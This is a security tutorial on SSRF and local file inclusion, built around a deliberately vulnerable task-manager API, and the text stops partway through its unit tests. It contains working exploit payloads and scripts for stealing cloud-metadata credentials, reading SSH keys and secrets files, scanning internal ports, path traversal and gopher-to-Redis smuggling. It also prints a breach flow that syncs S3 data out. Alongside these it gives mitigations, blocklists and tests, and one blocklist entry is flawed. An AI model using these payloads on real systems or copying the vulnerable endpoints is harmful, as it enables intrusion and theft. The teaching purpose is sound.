# Server-Side Request Forgery (SSRF) & Local File Inclusion (LFI) (CWE-918, CWE-22)

## Overview

Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) are critical vulnerabilities that allow attackers to abuse server functionality to access internal resources, cloud metadata services, and local files. These vulnerabilities can lead to data exposure, internal network reconnaissance, and potential remote code execution.

**OWASP Top 10 2021 Ranking**: #10 - Server-Side Request Forgery (SSRF)
**CVSS Base Score**: 6.5 - 9.9 (Medium to Critical)
**Common Attack Vector**: URL Parameters, File Upload Features, External Resource Fetching

## Technical Details

### How SSRF Works

SSRF occurs when a web application fetches remote resources without validating user-supplied URLs. Attackers can manipulate these URLs to:
- Access internal network services
- Read cloud metadata services (AWS, GCP, Azure)
- Perform port scanning on internal networks
- Access restricted external resources

### How LFI Works

LFI occurs when applications include files based on user input without proper validation. Attackers can exploit this to:
- Read sensitive system files
- Access application configuration files
- Retrieve database credentials
- Potentially achieve remote code execution

### Vulnerability Implementation in Our Application

**Location**: Profile picture upload and task import functionality

```javascript
// VULNERABLE CODE - Profile Picture Upload with SSRF
app.post('/api/users/avatar', authenticateUser, async (req, res) => {
  const { imageUrl, fetchFromUrl } = req.body;
  
  if (fetchFromUrl && imageUrl) {
    try {
      // VULNERABILITY: No URL validation - allows SSRF attacks
      const response = await axios.get(imageUrl, {
        timeout: 10000,
        maxRedirects: 5
      });
      
      // VULNERABILITY: Allows fetching internal services and files
      if (imageUrl.startsWith('file://')) {
        // Local file inclusion vulnerability
        const filePath = imageUrl.replace('file://', '');
        const fileContent = fs.readFileSync(filePath, 'utf8');
        return res.json({ 
          success: true, 
          content: fileContent,
          message: 'File content retrieved'
        });
      }
      
      // Save the fetched image
      const fileName = `avatar_${req.user.id}_${Date.now()}.jpg`;
      const filePath = path.join('./uploads', fileName);
      
      fs.writeFileSync(filePath, response.data);
      
      // Update user avatar in database
      await prisma.user.update({
        where: { id: req.user.id },
        data: { avatarUrl: `/uploads/${fileName}` }
      });
      
      res.json({ success: true, avatarUrl: `/uploads/${fileName}` });
      
    } catch (error) {
      // VULNERABILITY: Error messages leak internal network information
      res.status(500).json({ 
        error: 'Failed to fetch image',
        details: error.message,
        requestedUrl: imageUrl,
        internalError: error.code
      });
    }
  }
});

// VULNERABLE CODE - File Serving with Path Traversal
app.get('/api/files/:filename', (req, res) => {
  const { filename } = req.params;
  
  // VULNERABILITY: Path traversal - no input sanitization
  const filePath = path.join('./uploads', filename);
  
  try {
    // VULNERABILITY: Allows reading any file on the system
    const fileContent = fs.readFileSync(filePath);
    res.send(fileContent);
  } catch (error) {
    res.status(404).json({ error: 'File not found', path: filePath });
  }
});

// VULNERABLE CODE - Task Import with Advanced SSRF
app.post('/api/tasks/import', authenticateUser, async (req, res) => {
  const { importUrl, format } = req.body;
  
  try {
    // VULNERABILITY: Allows requests to internal network and cloud metadata
    const response = await axios.get(importUrl, {
      headers: {
        'User-Agent': 'TaskManager-Importer/1.0'
      }
    });
    
    // VULNERABILITY: Exposes internal service responses
    if (importUrl.includes('169.254.169.254')) {
      // AWS metadata service exploitation
      return res.json({
        success: true,
        metadata: response.data,
        message: 'Cloud metadata retrieved'
      });
    }
    
    if (importUrl.includes('localhost') || importUrl.includes('127.0.0.1')) {
      // Internal service scanning
      return res.json({
        success: true,
        internalService: response.data,
        headers: response.headers,
        status: response.status
      });
    }
    
    res.json({ success: true, data: response.data });
    
  } catch (error) {
    // VULNERABILITY: Network error information disclosure
    res.status(500).json({
      error: 'Import failed',
      targetUrl: importUrl,
      networkError: error.message,
      errorCode: error.code,
      responseStatus: error.response?.status,
      responseHeaders: error.response?.headers
    });
  }
});
```

## Exploitation Techniques

### 1. Cloud Metadata Service Exploitation

**Objective**: Access cloud provider metadata services to retrieve credentials and configuration

```bash
# AWS EC2 Metadata Service
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://169.254.169.254/latest/meta-data/","format":"json"}'

# AWS IAM Credentials
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","format":"json"}'

# Google Cloud Metadata
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token","format":"json"}'

# Azure Metadata Service
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","format":"json"}'
```

### 2. Internal Network Reconnaissance

**Objective**: Scan internal network services and gather information

```bash
# Port scanning internal services
for port in 22 80 443 3306 5432 6379 8080; do
  curl -X POST http://localhost:3000/api/users/avatar \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"imageUrl\":\"http://localhost:$port\",\"fetchFromUrl\":true}"
done

# Database service discovery
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:5432","fetchFromUrl":true}'

# Redis service access
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://localhost:6379/info","fetchFromUrl":true}'

# Internal web services
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"http://192.168.1.100:8080/admin","fetchFromUrl":true}'
```

### 3. Local File Inclusion Attacks

**Objective**: Read sensitive files from the server filesystem

```bash
# Read system files
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"file:///etc/passwd","fetchFromUrl":true}'

# Read application configuration
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"file:///app/.env","fetchFromUrl":true}'

# Read SSH keys
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"file:///root/.ssh/id_rsa","fetchFromUrl":true}'

# Read database files
curl -X POST http://localhost:3000/api/users/avatar \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"imageUrl":"file:///var/lib/postgresql/data/postgresql.conf","fetchFromUrl":true}'
```

### 4. Path Traversal Exploitation

**Objective**: Access files outside the intended directory using path traversal

```bash
# Basic path traversal
curl -H "Authorization: Bearer $TOKEN" \
     "http://localhost:3000/api/files/../../../../etc/passwd"

# Windows path traversal
curl -H "Authorization: Bearer $TOKEN" \
     "http://localhost:3000/api/files/..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

# URL encoded path traversal
curl -H "Authorization: Bearer $TOKEN" \
     "http://localhost:3000/api/files/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encoded
curl -H "Authorization: Bearer $TOKEN" \
     "http://localhost:3000/api/files/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

### 5. Advanced SSRF Techniques

**Objective**: Bypass common SSRF protections and access restricted resources

```bash
# IP address variations
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://127.0.0.1:8080/admin","format":"json"}'

# Decimal IP representation
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://2130706433/","format":"json"}'  # 127.0.0.1 in decimal

# Hexadecimal IP representation
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://0x7f000001/","format":"json"}'  # 127.0.0.1 in hex

# DNS rebinding attack
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"http://attacker-controlled-domain.com/redirect-to-internal","format":"json"}'

# Protocol smuggling
curl -X POST http://localhost:3000/api/tasks/import \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"importUrl":"gopher://localhost:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a","format":"json"}'
```

## Step-by-Step Exploitation Tutorial

### Phase 1: Discovery and Reconnaissance

1. **Identify SSRF Entry Points**
   ```bash
   # Test basic SSRF functionality
   curl -X POST http://localhost:3000/api/users/avatar \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://httpbin.org/ip","fetchFromUrl":true}'
   
   # Test task import functionality
   curl -X POST http://localhost:3000/api/tasks/import \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"importUrl":"http://httpbin.org/headers","format":"json"}'
   ```

2. **Test Internal Network Access**
   ```bash
   # Test localhost access
   curl -X POST http://localhost:3000/api/users/avatar \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://localhost:80","fetchFromUrl":true}'
   
   # Test private IP ranges
   for ip in 192.168.1.1 10.0.0.1 172.16.0.1; do
     curl -X POST http://localhost:3000/api/users/avatar \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d "{\"imageUrl\":\"http://$ip\",\"fetchFromUrl\":true}"
   done
   ```

3. **Test File Protocol Support**
   ```bash
   # Test file:// protocol
   curl -X POST http://localhost:3000/api/users/avatar \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"file:///etc/hostname","fetchFromUrl":true}'
   ```

### Phase 2: Cloud Metadata Exploitation

1. **AWS Metadata Service**
   ```bash
   # Get instance metadata
   curl -X POST http://localhost:3000/api/tasks/import \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"importUrl":"http://169.254.169.254/latest/meta-data/instance-id","format":"json"}'
   
   # List IAM roles
   curl -X POST http://localhost:3000/api/tasks/import \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"importUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","format":"json"}'
   
   # Get IAM credentials (replace ROLE_NAME with actual role)
   curl -X POST http://localhost:3000/api/tasks/import \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"importUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME","format":"json"}'
   ```

2. **Google Cloud Metadata**
   ```bash
   # Get access token
   curl -X POST http://localhost:3000/api/tasks/import \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"importUrl":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token","format":"json"}'
   
   # Get project information
   curl -X POST http://localhost:3000/api/tasks/import \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"importUrl":"http://metadata.google.internal/computeMetadata/v1/project/project-id","format":"json"}'
   ```

### Phase 3: Internal Service Discovery

1. **Port Scanning Script**
   ```python
   import requests
   import json
   
   def scan_internal_ports(token, target_ip="localhost", ports=None):
       if ports is None:
           ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
       
       headers = {
           'Authorization': f'Bearer {token}',
           'Content-Type': 'application/json'
       }
       
       open_ports = []
       
       for port in ports:
           payload = {
               'imageUrl': f'http://{target_ip}:{port}',
               'fetchFromUrl': True
           }
           
           try:
               response = requests.post(
                   'http://localhost:3000/api/users/avatar',
                   headers=headers,
                   json=payload,
                   timeout=5
               )
               
               if response.status_code == 200:
                   open_ports.append(port)
                   print(f"Port {port}: OPEN")
               else:
                   print(f"Port {port}: CLOSED or FILTERED")
                   
           except requests.exceptions.RequestException as e:
               print(f"Port {port}: ERROR - {e}")
       
       return open_ports
   
   # Execute scan
   token = "your_jwt_token_here"
   open_ports = scan_internal_ports(token)
   print(f"Open ports found: {open_ports}")
   ```

2. **Service Fingerprinting**
   ```bash
   # Redis service detection
   curl -X POST http://localhost:3000/api/users/avatar \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://localhost:6379","fetchFromUrl":true}'
   
   # Elasticsearch detection
   curl -X POST http://localhost:3000/api/users/avatar \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://localhost:9200","fetchFromUrl":true}'
   
   # MongoDB detection
   curl -X POST http://localhost:3000/api/users/avatar \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://localhost:27017","fetchFromUrl":true}'
   ```

### Phase 4: File System Exploitation

1. **Systematic File Enumeration**
   ```python
   import requests
   import json
   
   def read_files(token, file_paths):
       headers = {
           'Authorization': f'Bearer {token}',
           'Content-Type': 'application/json'
       }
       
       results = {}
       
       for file_path in file_paths:
           payload = {
               'imageUrl': f'file://{file_path}',
               'fetchFromUrl': True
           }
           
           try:
               response = requests.post(
                   'http://localhost:3000/api/users/avatar',
                   headers=headers,
                   json=payload
               )
               
               if response.status_code == 200:
                   data = response.json()
                   if 'content' in data:
                       results[file_path] = data['content']
                       print(f"Successfully read: {file_path}")
                   else:
                       print(f"No content returned for: {file_path}")
               else:
                   print(f"Failed to read {file_path}: HTTP {response.status_code}")
                   
           except requests.exceptions.RequestException as e:
               print(f"Error reading {file_path}: {e}")
       
       return results
   
   # Target files
   sensitive_files = [
       '/etc/passwd',
       '/etc/shadow',
       '/etc/hosts',
       '/proc/version',
       '/proc/cpuinfo',
       '/app/.env',
       '/app/package.json',
       '/root/.ssh/id_rsa',
       '/home/user/.ssh/id_rsa',
       '/var/log/auth.log'
   ]
   
   token = "your_jwt_token_here"
   file_contents = read_files(token, sensitive_files)
   
   # Save results
   with open('lfi_results.json', 'w') as f:
       json.dump(file_contents, f, indent=2)
   ```

2. **Path Traversal Automation**
   ```bash
   #!/bin/bash
   # Automated path traversal testing
   
   TOKEN="your_jwt_token_here"
   BASE_URL="http://localhost:3000/api/files"
   
   # Test various path traversal payloads
   PAYLOADS=(
       "../../../../etc/passwd"
       "..\\..\\..\\..\\etc\\passwd"
       "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
       "....//....//....//....//etc/passwd"
       "..%252f..%252f..%252f..%252fetc%252fpasswd"
   )
   
   for payload in "${PAYLOADS[@]}"; do
       echo "Testing payload: $payload"
       curl -s -H "Authorization: Bearer $TOKEN" \
            "$BASE_URL/$payload" | head -5
       echo "---"
   done
   ```

## Real-World Examples

### Case Study 1: Capital One Data Breach (2019)

**Impact**: 100+ million customers affected
**Attack Vector**: SSRF to access AWS metadata service
**Data Compromised**: Credit applications, SSNs, bank account numbers

**Technical Details**:
- Attacker exploited SSRF in web application firewall
- Used SSRF to access AWS EC2 metadata service
- Retrieved IAM credentials from metadata service
- Used credentials to access S3 buckets containing customer data
- Maintained access for several months

**Attack Flow**:
```bash
# 1. Initial SSRF exploitation
POST /vulnerable-endpoint
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# 2. Retrieve IAM role credentials
POST /vulnerable-endpoint  
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/S3-Role"}

# 3. Use credentials to access S3 buckets
aws s3 ls --profile stolen-credentials
aws s3 sync s3://customer-data-bucket ./stolen-data/
```

### Case Study 2: Shopify SSRF (2017)

**Impact**: Internal network access and data exposure
**Attack Vector**: SSRF in image processing functionality
**Business Impact**: $25,000 bug bounty payout

**Technical Details**:
- Image upload feature fetched images from URLs
- No validation of target URLs allowed internal access
- Attacker accessed internal services and cloud metadata
- Could read internal configuration and service data

### Case Study 3: Slack SSRF (2015)

**Impact**: Internal service access
**Attack Vector**: SSRF in link preview functionality
**Discovery**: Security researcher found during testing

**Technical Details**:
- Link preview feature fetched content from URLs
- Insufficient URL validation allowed internal requests
- Could access internal services on localhost
- Potential for cloud metadata service access

## Business Impact Assessment

### Financial Impact

| Impact Category | Low Risk | Medium Risk | High Risk | Critical Risk |
|----------------|----------|-------------|-----------|---------------|
| Data Breach | $50K - $200K | $200K - $1M | $1M - $10M | $10M+ |
| Cloud Resource Abuse | $1K - $10K | $10K - $50K | $50K - $200K | $200K+ |
| Internal System Access | $25K - $100K | $100K - $500K | $500K - $2M | $2M+ |
| Regulatory Fines | $10K - $50K | $50K - $250K | $250K - $2M | $2M+ |

### Risk Scenarios

**Critical Risk Applications**:
- Cloud-hosted applications with metadata access
- Applications with internal network connectivity
- File processing and upload systems
- Webhook and callback implementations
- Image processing and proxy services

**Attack Consequences**:
- Cloud credential theft and resource abuse
- Internal network reconnaissance and lateral movement
- Sensitive file disclosure and configuration exposure
- Database access and data exfiltration
- Remote code execution in some scenarios
- Compliance violations and regulatory penalties

### Compliance Implications

**Regulatory Standards**:
- **PCI DSS**: Requirement 6.5.1 - Injection flaws
- **GDPR**: Article 32 - Security of processing
- **HIPAA**: 164.312(a)(1) - Access control
- **SOX**: Section 404 - Internal controls
- **ISO 27001**: A.14.2.5 - Secure system engineering principles

**Cloud Security Standards**:
- **AWS Well-Architected**: Security pillar
- **Azure Security Benchmark**: Network security controls
- **Google Cloud Security**: VPC security best practices

## Detection Methods

### Automated Scanning Tools

1. **SSRFmap**
   ```bash
   # Install SSRFmap
   git clone https://github.com/swisskyrepo/SSRFmap
   cd SSRFmap
   pip install -r requirements.txt
   
   # Scan for SSRF vulnerabilities
   python ssrfmap.py -r request.txt -p url -m readfiles
   python ssrfmap.py -r request.txt -p url -m portscan
   python ssrfmap.py -r request.txt -p url -m aws
   ```

2. **Burp Suite Extensions**
   ```bash
   # Install Collaborator Everywhere extension
   # Install SSRF Sheriff extension
   # Configure Burp Collaborator for out-of-band detection
   ```

3. **Custom SSRF Scanner**
   ```python
   import requests
   import threading
   from urllib.parse import urljoin
   
   class SSRFScanner:
       def __init__(self, base_url, token):
           self.base_url = base_url
           self.token = token
           self.headers = {
               'Authorization': f'Bearer {token}',
               'Content-Type': 'application/json'
           }
           self.vulnerabilities = []
       
       def test_ssrf_endpoint(self, endpoint, parameter, test_url):
           try:
               payload = {parameter: test_url}
               response = requests.post(
                   urljoin(self.base_url, endpoint),
                   headers=self.headers,
                   json=payload,
                   timeout=10
               )
               
               if response.status_code == 200:
                   # Check for successful SSRF indicators
                   if any(indicator in response.text.lower() for indicator in 
                          ['localhost', '127.0.0.1', 'internal', 'metadata']):
                       self.vulnerabilities.append({
                           'endpoint': endpoint,
                           'parameter': parameter,
                           'test_url': test_url,
                           'response': response.text[:500]
                       })
                       return True
           except:
               pass
           return False
       
       def scan_common_endpoints(self):
           endpoints = [
               ('/api/users/avatar', 'imageUrl'),
               ('/api/tasks/import', 'importUrl'),
               ('/api/webhook/callback', 'url'),
               ('/api/proxy/fetch', 'target')
           ]
           
           test_urls = [
               'http://localhost:80',
               'http://127.0.0.1:22',
               'http://169.254.169.254/latest/meta-data/',
               'file:///etc/passwd'
           ]
           
           for endpoint, param in endpoints:
               for test_url in test_urls:
                   self.test_ssrf_endpoint(endpoint, param, test_url)
       
       def generate_report(self):
           print(f"SSRF Scan Results: {len(self.vulnerabilities)} vulnerabilities found")
           for vuln in self.vulnerabilities:
               print(f"Endpoint: {vuln['endpoint']}")
               print(f"Parameter: {vuln['parameter']}")
               print(f"Test URL: {vuln['test_url']}")
               print(f"Response: {vuln['response']}")
               print("---")
   
   # Usage
   scanner = SSRFScanner('http://localhost:3000', 'your_token')
   scanner.scan_common_endpoints()
   scanner.generate_report()
   ```

### Manual Testing Techniques

1. **SSRF Detection Checklist**
   ```bash
   # Test localhost variations
   curl -X POST $ENDPOINT -d '{"url":"http://localhost"}'
   curl -X POST $ENDPOINT -d '{"url":"http://127.0.0.1"}'
   curl -X POST $ENDPOINT -d '{"url":"http://0.0.0.0"}'
   curl -X POST $ENDPOINT -d '{"url":"http://[::1]"}'
   
   # Test cloud metadata services
   curl -X POST $ENDPOINT -d '{"url":"http://169.254.169.254/"}'
   curl -X POST $ENDPOINT -d '{"url":"http://metadata.google.internal/"}'
   
   # Test file protocol
   curl -X POST $ENDPOINT -d '{"url":"file:///etc/passwd"}'
   curl -X POST $ENDPOINT -d '{"url":"file:///proc/version"}'
   
   # Test internal network ranges
   curl -X POST $ENDPOINT -d '{"url":"http://192.168.1.1"}'
   curl -X POST $ENDPOINT -d '{"url":"http://10.0.0.1"}'
   curl -X POST $ENDPOINT -d '{"url":"http://172.16.0.1"}'
   ```

2. **LFI Detection Patterns**
   ```bash
   # Basic path traversal
   curl "$BASE_URL/../../../../etc/passwd"
   curl "$BASE_URL/..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
   
   # Encoded traversal
   curl "$BASE_URL/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   curl "$BASE_URL/..%252f..%252f..%252f..%252fetc%252fpasswd"
   
   # Null byte injection (older systems)
   curl "$BASE_URL/../../../../etc/passwd%00.jpg"
   
   # Filter bypass attempts
   curl "$BASE_URL/....//....//....//....//etc/passwd"
   curl "$BASE_URL/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
   ```

### Code Review Checklist

- [ ] All external URLs are validated against allowlists
- [ ] Internal IP ranges and localhost are blocked
- [ ] File protocol access is disabled or restricted
- [ ] Cloud metadata service access is blocked
- [ ] Path traversal protection is implemented
- [ ] File access is restricted to designated directories
- [ ] Input validation includes URL parsing and validation
- [ ] Network timeouts and connection limits are enforced
- [ ] Error messages don't expose internal information
- [ ] Logging captures SSRF/LFI attempts for monitoring

## Prevention Strategies

### 1. URL Validation and Allowlisting

```javascript
// SECURE CODE - URL Validation
const url = require('url');
const dns = require('dns').promises;

const ALLOWED_PROTOCOLS = ['http:', 'https:'];
const BLOCKED_HOSTS = [
  'localhost',
  '127.0.0.1',
  '0.0.0.0',
  '::1',
  '169.254.169.254', // AWS metadata
  'metadata.google.internal', // GCP metadata
  '100.64.0.0/10', // Azure metadata range
];

const ALLOWED_DOMAINS = [
  'api.example.com',
  'cdn.example.com',
  'images.example.com'
];

async function validateUrl(inputUrl) {
  try {
    const parsedUrl = new URL(inputUrl);
    
    // Check protocol
    if (!ALLOWED_PROTOCOLS.includes(parsedUrl.protocol)) {
      throw new Error('Protocol not allowed');
    }
    
    // Check for blocked hosts
    if (BLOCKED_HOSTS.includes(parsedUrl.hostname)) {
      throw new Error('Host not allowed');
    }
    
    // Check against allowlist
    if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
      throw new Error('Domain not in allowlist');
    }
    
    // Resolve DNS to check for internal IPs
    const addresses = await dns.lookup(parsedUrl.hostname, { all: true });
    for (const addr of addresses) {
      if (isPrivateIP(addr.address)) {
        throw new Error('Private IP address not allowed');
      }
    }
    
    return parsedUrl;
  } catch (error) {
    throw new Error(`Invalid URL: ${error.message}`);
  }
}

function isPrivateIP(ip) {
  const privateRanges = [
    /^10\./,
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
    /^192\.168\./,
    /^127\./,
    /^169\.254\./,
    /^::1$/,
    /^fc00:/,
    /^fe80:/
  ];
  
  return privateRanges.some(range => range.test(ip));
}

// SECURE CODE - Avatar Upload with Validation
app.post('/api/users/avatar', authenticateUser, async (req, res) => {
  const { imageUrl, fetchFromUrl } = req.body;
  
  if (fetchFromUrl && imageUrl) {
    try {
      // Validate URL before making request
      const validatedUrl = await validateUrl(imageUrl);
      
      // Make request with additional security measures
      const response = await axios.get(validatedUrl.href, {
        timeout: 5000,
        maxRedirects: 3,
        maxContentLength: 10 * 1024 * 1024, // 10MB limit
        headers: {
          'User-Agent': 'TaskManager/1.0'
        }
      });
      
      // Validate content type
      const contentType = response.headers['content-type'];
      if (!contentType || !contentType.startsWith('image/')) {
        return res.status(400).json({ error: 'Invalid content type' });
      }
      
      // Save file securely
      const fileName = `avatar_${req.user.id}_${Date.now()}.jpg`;
      const filePath = path.join('./uploads', fileName);
      
      fs.writeFileSync(filePath, response.data);
      
      await prisma.user.update({
        where: { id: req.user.id },
        data: { avatarUrl: `/uploads/${fileName}` }
      });
      
      res.json({ success: true, avatarUrl: `/uploads/${fileName}` });
      
    } catch (error) {
      console.error('Avatar upload error:', error);
      res.status(400).json({ error: 'Failed to fetch image' });
    }
  } else {
    res.status(400).json({ error: 'Invalid request' });
  }
});
```

### 2. Secure File Serving

```javascript
// SECURE CODE - File Serving with Path Validation
const path = require('path');

const UPLOAD_DIR = path.resolve('./uploads');
const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];

function validateFilePath(filename) {
  // Remove any path traversal attempts
  const sanitized = path.basename(filename);
  
  // Check file extension
  const ext = path.extname(sanitized).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    throw new Error('File type not allowed');
  }
  
  // Construct safe file path
  const filePath = path.join(UPLOAD_DIR, sanitized);
  
  // Ensure path is within upload directory
  if (!filePath.startsWith(UPLOAD_DIR)) {
    throw new Error('Path traversal detected');
  }
  
  return filePath;
}

app.get('/api/files/:filename', authenticateUser, (req, res) => {
  const { filename } = req.params;
  
  try {
    const filePath = validateFilePath(filename);
    
    // Check if file exists
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    // Set appropriate headers
    res.setHeader('Content-Disposition', 'attachment');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    // Stream file to response
    const fileStream = fs.createReadStream(filePath);
    fileStream.pipe(res);
    
  } catch (error) {
    console.error('File serving error:', error);
    res.status(400).json({ error: 'Invalid file request' });
  }
});
```

### 3. Network-Level Protection

```javascript
// SECURE CODE - Network Configuration
const axios = require('axios');
const { Agent } = require('https');

// Create secure HTTP client
const secureHttpClient = axios.create({
  timeout: 5000,
  maxRedirects: 3,
  httpsAgent: new Agent({
    rejectUnauthorized: true,
    secureProtocol: 'TLSv1_2_method'
  }),
  // Disable following redirects to localhost
  beforeRedirect: (options, { headers }) => {
    const url = new URL(options.href);
    if (isPrivateIP(url.hostname)) {
      throw new Error('Redirect to private IP blocked');
    }
  }
});

// Add request interceptor for additional validation
secureHttpClient.interceptors.request.use((config) => {
  const url = new URL(config.url);
  
  // Block private IPs
  if (isPrivateIP(url.hostname)) {
    throw new Error('Private IP access blocked');
  }
  
  // Block cloud metadata services
  if (url.hostname === '169.254.169.254' || 
      url.hostname === 'metadata.google.internal') {
    throw new Error('Cloud metadata access blocked');
  }
  
  return config;
});

// SECURE CODE - Task Import with Validation
app.post('/api/tasks/import', authenticateUser, async (req, res) => {
  const { importUrl, format } = req.body;
  
  try {
    // Validate URL
    const validatedUrl = await validateUrl(importUrl);
    
    // Make secure request
    const response = await secureHttpClient.get(validatedUrl.href, {
      headers: {
        'Accept': 'application/json, text/plain',
        'User-Agent': 'TaskManager-Importer/1.0'
      }
    });
    
    // Validate response size
    if (response.data.length > 1024 * 1024) { // 1MB limit
      return res.status(400).json({ error: 'Response too large' });
    }
    
    // Process imported data safely
    let importedTasks = [];
    if (format === 'json') {
      try {
        const data = JSON.parse(response.data);
        importedTasks = validateImportedTasks(data);
      } catch (parseError) {
        return res.status(400).json({ error: 'Invalid JSON format' });
      }
    }
    
    res.json({ 
      success: true, 
      imported: importedTasks.length,
      message: 'Tasks imported successfully'
    });
    
  } catch (error) {
    console.error('Import error:', error);
    res.status(400).json({ error: 'Import failed' });
  }
});

function validateImportedTasks(data) {
  if (!Array.isArray(data)) {
    throw new Error('Expected array of tasks');
  }
  
  return data.filter(task => {
    return task.title && 
           typeof task.title === 'string' && 
           task.title.length <= 200;
  });
}
```

### 4. Infrastructure-Level Protection

```yaml
# Docker network configuration
version: '3.8'
services:
  app:
    build: .
    networks:
      - app-network
    environment:
      - NODE_ENV=production
    # Restrict network access
    cap_drop:
      - NET_RAW
      - NET_ADMIN
    security_opt:
      - no-new-privileges:true

  # Network policy to block metadata services
  nginx:
    image: nginx:alpine
    networks:
      - app-network
    configs:
      - source: nginx_config
        target: /etc/nginx/nginx.conf

networks:
  app-network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16

configs:
  nginx_config:
    content: |
      # Block access to cloud metadata services
      location ~* ^/.*169\.254\.169\.254.* {
        return 403;
      }
      location ~* ^/.*metadata\.google\.internal.* {
        return 403;
      }
```

## Testing Procedures

### Unit Tests

```javascript
describe('SSRF Prevention', () => {
  test('should block localhost URLs', async () => {
    const response = await request(app)
      .post('/api/users/avatar')
      .set('Authorization', `Bearer ${validToken}`)
      .send({
        imageUrl: 'http://localhost:8080',
        fetchFromUrl: true
      });
    
    expect(response.status).toBe(400);
    expect(response.body.error).toContain('not allowed');
  });
  
  test('should block cloud metadata services', async () => {
    const response = await request(app)
      .post('/api/tasks/import')
      .set('Authorization', `Bearer ${validToken}`)
      .send({
        importUrl: 'http://169.254.169.254/latest/meta-data/',
        format: 'json'
      });
    
    expect(response.status).toBe(400);
    expect(response.body.error).toContain('not allowed');
  });
  
  test('should block file protocol', async () => {
    const response = await request(app)
      .post('/api/users/avatar')
      .set('Authorization', `Bearer ${validToken}`)
      .send({
        imageUrl: 'file:///etc/passwd',
        fetchFromUrl: true
      });
    
    expect(response.status).toBe(400);
